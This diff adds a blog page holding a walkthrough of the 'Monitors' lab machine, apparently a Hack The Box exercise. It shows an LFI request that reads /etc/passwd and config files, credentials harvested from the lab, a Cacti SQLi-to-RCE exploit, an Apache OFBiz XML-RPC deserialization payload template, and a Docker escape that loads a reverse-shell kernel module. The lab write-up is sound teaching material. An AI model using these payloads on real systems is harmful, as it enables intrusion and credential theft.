@@ -1,0 +1,298 @@
+<!DOCTYPE HTML>
+<html>
+	<head>
+		<title>Writeups | bokkisec</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+	</head>
+	<body class="is-preload">
+
+		<!-- Header -->
+			<div id="header">
+
+				<div class="top">
+
+					<!-- Logo -->
+						<div id="logo">
+							<!-- <span class="image avatar48"><img src="images/avatar.jpg" alt="" /></span> -->
+							<a href="https://bokkisec.com"><span class="icon solid fa-home"></span>bokkisec</a>
+							<p style="padding-bottom: 10px;"></p>
+							<a href=""><h1 id="title">Monitors</h1></a>
+						</div>
+
+					<!-- Nav -->
+						<nav id="nav">
+							<ul>
+								<li><a href="#enu" id="sec1-link"><span>Enumeration</span></a></li>
+								<li><a href="#foothold" id="sec2-link"><span>Foothold</span></a></li>
+								<li><a href="#lateral" id="sec3-link"><span>Lateral Movement</span></a></li>
+								<li><a href="#privesc" id="sec4-link"><span>Privilege Escalation</span></a></li>
+							</ul>
+						</nav>
+
+				</div>
+
+				<div class="bottom">
+
+					<!-- Social Icons -->
+						<ul class="icons">
+							<li><a href="mailto:joshchung02@gmail.com" class="icon fa-envelope"><span class="label">Email</span></a></li>
+							<li><a href="https://www.linkedin.com/in/joshchung02/" class="icon brands fa-linkedin"><span class="label">LinkedIn</span></a></li>
+							<li><a href="https://github.com/bokkisec" class="icon brands fa-github"><span class="label">GitHub</span></a></li>
+						</ul>
+
+				</div>
+
+			</div>
+
+		<!-- Main -->
+			<div id="main">
+
+				<!-- Intro -->
+				<section id="top" class="one dark" style="background-image: url('images/hard.jpg')">
+					<div class="container">
+						<header>
+							<h2 style="text-align: center;">Monitors</h2>
+							<div style="text-align: center;">Published: May 13, 2025</div>
+							<div style="text-align: center;"><img src="images/monitors/monitors.png"></div>
+						</header>
+					</div>
+				</section>
+
+				<!-- Content -->
+					<section id="enu" class="two">
+						<div class="container">
+							<div class="content">
+								<header>
+									<h2>Enumeration</h2>
+								</header>
+
+								<h3>Scan</h3>
+								<p>
+									<pre>nmap -A -oN nmap/detailed.nmap -p22,80 10.10.10.238</pre>
+									<img src="images/monitors/enu1.png">
+								</p>
+
+								<h3>Wordpress</h3>
+								<p>
+									Upon visiting the website at port 80, we find a Wordpress website.
+									<img src="images/monitors/enu2.png">
+								</p>
+								<p>
+									After some basic enumeration, we find that there is no <code>index.html</code> at <code>/wp-content/plugins</code>, so we can view the installed plugins.
+									<img src="images/monitors/enu3.png">
+								</p>
+								<p>
+									By looking at the <code>readme.txt</code> file, we can figure out that it's version 1.0
+									<img src="images/monitors/enu4.png">
+								</p>
+							</div>
+						</div>
+					</section>
+
+					<section id="foothold" class="two">
+						<div class="container">
+							<div class="content">
+								<header>
+									<h2>Foothold</h2>
+								</header>
+
+								<h3>Exploiting WP Plugin</h3>
+								<p>
+									Next, we can look for public exploits using <code>searchsploit</code>
+									<pre>searchsploit wp spritz</pre>
+									<img src="images/monitors/foo1.png">
+								</p>
+								<p>
+									The exploitdb file informs us of a LFI vulnerability, which can be achieved with the following <code>GET</code> request:
+									<pre>GET /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd</pre>
+									<img src="images/monitors/foo2.png">
+									From the <code>/etc/passwd</code> file, we note interesting users such as marcus and mysql
+								</p>
+								<p>
+									Now that we have LFI, our next objective is choosing files to view based on what we know about the box to further our access. 
+									We should look for files related to Wordpress and Apache.<br>
+									Starting with <code>wp-config.php</code>:
+									<img src="images/monitors/foo3.png">
+									We found a plaintext password! <code>BestAdministrator@2020!</code>
+								</p>
+								<p>
+									After trying the password on Wordpress, we quickly find out that it is not a valid password for it.<br>
+									Let's take a look at the apache config now at <code>/etc/apache2/sites-enabled/000-default.conf</code>:
+									<img src="images/monitors/foo4.png">
+								</p>
+
+								<h3>Cacti</h3>
+								<p>
+									From the apache config, we learn of a new VHOST <code>cacti-admin.monitors.htb</code>
+									<img src="images/monitors/foo5.png">
+									From the home page, we learn that the version is 1.2.12, and trying the creds "admin:BestAdministrator@2020" works!<br>
+									With this, we are able to use a public exploit 
+									(<a href="https://www.exploit-db.com/exploits/49810">https://www.exploit-db.com/exploits/49810</a>) 
+									to gain a foothold as <code>www-data</code> through authenticated SQLi to RCE.
+								</p>
+
+							</div>
+						</div>
+					</section>
+
+					<section id="lateral" class="two">
+						<div class="container">
+							<div class="content">
+
+								<header>
+									<h2>Lateral Movement</h2>
+								</header>
+
+								<h3>Enumeration</h3>
+								<p>
+									Checking out database with “BestAdministrator@2020!” as the password:
+									<pre>mysql -u wpadmin -p</pre>
+									<img src="images/monitors/lat1.png">
+								</p>
+								<p>
+									Looking at cacti’s config and finding database creds:
+									<img src="images/monitors/lat2.png">
+								</p>
+								<p>
+									Checking out database with password "cactipass"
+									<pre>mysql -u cacti -p</pre>
+									<img src="images/monitors/lat3.png">
+								</p>
+
+								<h3>Credential Theft</h3>
+								<p>
+									In marcus' home directory, we see a non-default hidden directory called ".backup":
+									<img src="images/monitors/lat4.png">
+								</p>
+								<p>
+									We can try to figure out if there is a <code>systemd</code> service that is using this directory with the following:
+									<pre>grep -Ri '\.backup' /etc 2>/dev/null</pre>
+									<img src="images/monitors/lat5.png">
+									The output indicates that there is a service using a script called <code>backup.sh</code>.
+								</p>
+								<p>
+									After taking a look at the script, we find plaintext credentials:
+									<img src="images/monitors/lat6.png">
+									After trying the password in a couple places, we find that it works through ssh with marcus (<code>marcus:VerticalEdge2020</code>)
+								</p>
+
+							</div>
+						</div>
+					</section>
+
+					<section id="privesc" class="two">
+						<div class="container">
+							<div class="content">
+
+								<header>
+									<h2>Privilege Escalation</h2>
+								</header>
+
+								<h3>Enumeration</h3>
+								<p>
+									After learning that Docker is running on this box, we can take a look at the process list for anything interesting:
+									<pre>ps -ef | grep docker</pre>
+									<img src="images/monitors/pe1.png">
+								</p>
+								<p>
+									Since there is a docker container listening on port 8443, let's create an ssh tunnel to this port.
+									<pre>ssh -N -L 8443:127.0.0.1:8443 marcus@10.10.10.238</pre>
+								</p>
+								<p>
+									Upon navigating to the service, we get a 404, but we learn that it is a Tomcat server
+									<img src="images/monitors/pe2.png">
+								</p>
+								<p>
+									Let's try to find valid directories on this tomcat server with <code>gobuster</code>
+									<pre>gobuster dir -u https://127.0.0.1:8443 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -k</pre>
+									<img src="images/monitors/pe3.png">
+								</p>
+								<p>
+									Interestingly, navigating to a valid directory redirects us to Apache OfBiz login page.
+									<img src="images/monitors/pe4.png">
+									The bottom right corner of the page reveals that the version is 17.12.01, which has a public exploit available:
+									<pre>searchsploit ofbiz 17.12.01</pre>
+									<img src="images/monitors/pe5.png">
+								</p>
+
+								<h3>Apache OfBiz Exploit</h3>
+								<p>
+									After some research, we find a nice guide on the exploit:
+									<a href="https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496">https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496</a><br>
+									Download <code>ysoserial</code>, then create base64 encoded payloads like this:
+									<img src="images/monitors/pe6.png">
+									<img src="images/monitors/pe7.png">
+								</p>
+								<p>
+									With the payloads generated, make <code>POST</code> requests like this to get command execution:
+									<pre>POST /webtools/control/xmlrpc HTTP/1.1
+Host: your-ip
+Content-Type: application/xml
+Content-Length: 4093
+
+&lt;?xml version="1.0"?>
+&lt;methodCall>
+  &lt;methodName>ProjectDiscovery&lt;/methodName>
+  &lt;params>
+    &lt;param>
+      &lt;value>
+        &lt;struct>
+          &lt;member>
+            &lt;name>test&lt;/name>
+            &lt;value>
+              &lt;serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">[base64-payload]&lt;/serializable>
+            &lt;/value>
+          &lt;/member>
+        &lt;/struct>
+      &lt;/value>
+    &lt;/param>
+  &lt;/params>
+&lt;/methodCall></pre>
+								With this, we get a shell as root on the docker container.
+								</p>
+
+								<h3>Docker Escape</h3>
+								<p>
+									With the following command, we can learn of all capabilities of the docker container:
+									<pre>capsh --print</pre>
+									<img src="images/monitors/pe8.png">
+								</p>
+								<p>
+									<code>cap_sys_module</code> capability allows us to load kernel modules, and since the kernel is shared with the host, we can get code execution as the host's root user.<br>
+									Here is a great guide on how to create a reverse shell kernel module:<br>
+									<a href="https://greencashew.dev/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/">https://greencashew.dev/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/</a>
+								</p>
+								<p>
+									With the kernel module created, we get root by inserting it with <code>insmod</code>
+									<pre>insmod reverseshell_module.ko</pre>
+									<img src="images/monitors/pe9.png">
+								</p>
+
+							</div>
+						</div>
+					</section>
+			</div>
+
+		<!-- Footer -->
+			<div id="footer">
+
+				<!-- Copyright -->
+					<ul class="copyright">
+						<li>&copy; 2025 Joshua Chung</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
+					</ul>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
